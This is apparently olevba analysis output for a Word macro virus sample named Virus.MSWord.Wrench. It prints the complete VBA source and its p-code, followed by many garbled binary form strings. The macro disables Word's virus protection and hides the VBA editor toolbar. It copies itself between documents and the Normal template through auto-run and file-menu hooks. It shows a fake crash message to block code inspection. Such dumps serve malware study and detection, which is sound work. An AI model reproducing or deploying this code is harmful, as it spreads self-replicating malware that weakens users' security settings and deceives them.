olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wrench
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wrench - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bench.bas 
in file: Virus.MSWord.Wrench - OLE stream: 'Macros/VBA/Bench'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Stealth()
On Error Resume Next
Application.Options.VirusProtection = False
Application.Options.ConfirmConversions = False
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Visual Basic").Visible = False
CommandBars("Visual Basic").Enabled = False
End Function
Function BenchCore()
On Error Resume Next
If MacroContainer = NormalTemplate Then
    Set Carrier = NormalTemplate.VBProject.VBComponents
    Set host = ActiveDocument.VBProject.VBComponents
    Else
    Set Carrier = ActiveDocument.VBProject.VBComponents
    Set host = NormalTemplate.VBProject.VBComponents
End If

For x = 1 To 2
    If x = 1 Then MyMacroName = "Bench" Else MyMacroName = "BenchFrm"
        If host(MyMacroName).Name <> MyMacroName Then
            Carrier(MyMacroName).Export "c:\" & MyMacroName
            host.Import "c:\" & MyMacroName
        End If
Next x

Kill "c:\Bench*"

End Function
Sub ViewVBCode()
On Error Resume Next
ActiveDocument.Saved = True
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Application.Quit
End Sub
Sub AutoOpen()
On Error Resume Next
Call Stealth
Call BenchCore
End Sub
Sub AutoClose()
On Error Resume Next
Call BenchCore
If Left$(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
Sub ToolsMacro()
End Sub
Sub HelpAbout()
BenchFrm.Show
End Sub
Sub FormatStyle()
End Sub
Sub FileClose()
Call BenchCore
End Sub
Sub FileNew()
Call BenchCore
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileOpen()
Call BenchCore
Dialogs(wdDialogFileOpen).Show
End Sub
Sub Organizer()
ActiveDocument.Saved = True
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Application.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO BenchFrm.frm 
in file: Virus.MSWord.Wrench - OLE stream: 'Macros/VBA/BenchFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






















Private Sub CommandButton1_Click()
Unload Me
End Sub
Private Sub Image1_Click()
MsgBox "I'm Psycho Sushi!!!", vbInformation, "Sushi Power!"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Wrench
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Bench - 4184 bytes
' Line #0:
' 	FuncDefn (Function Stealth())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #5:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #6:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	EndFunc 
' Line #8:
' 	FuncDefn (Function BenchCore())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Carrier 
' Line #12:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set host 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Carrier 
' Line #15:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set host 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #19:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Bench"
' 	St MyMacroName 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0008 "BenchFrm"
' 	St MyMacroName 
' 	EndIf 
' Line #20:
' 	Ld MyMacroName 
' 	ArgsLd host 0x0001 
' 	MemLd New 
' 	Ld MyMacroName 
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0003 "c:\"
' 	Ld MyMacroName 
' 	Concat 
' 	Ld MyMacroName 
' 	ArgsLd Carrier 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #22:
' 	LitStr 0x0003 "c:\"
' 	Ld MyMacroName 
' 	Concat 
' 	Ld host 
' 	ArgsMemCall Import 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' Line #26:
' 	LitStr 0x0009 "c:\Bench*"
' 	ArgsCall Kill 0x0001 
' Line #27:
' Line #28:
' 	EndFunc 
' Line #29:
' 	FuncDefn (Sub ViewVBCode())
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #32:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #33:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub AutoOpen())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #38:
' 	ArgsCall (Call) BenchCore 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) BenchCore 0x0000 
' Line #43:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub ToolsMacro())
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub HelpAbout())
' Line #48:
' 	Ld BenchFrm 
' 	ArgsMemCall Show 0x0000 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub FormatStyle())
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub FileClose())
' Line #53:
' 	ArgsCall (Call) BenchCore 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub FileNew())
' Line #56:
' 	ArgsCall (Call) BenchCore 0x0000 
' Line #57:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub FileOpen())
' Line #60:
' 	ArgsCall (Call) BenchCore 0x0000 
' Line #61:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub Organizer())
' Line #64:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #65:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #66:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #67:
' 	EndSub 
' Macros/VBA/BenchFrm - 1808 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #23:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Private Sub Image1_Click())
' Line #26:
' 	LitStr 0x0013 "I'm Psycho Sushi!!!"
' 	Ld vbInformation 
' 	LitStr 0x000C "Sushi Power!"
' 	ArgsCall MsgBox 0x0003 
' Line #27:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
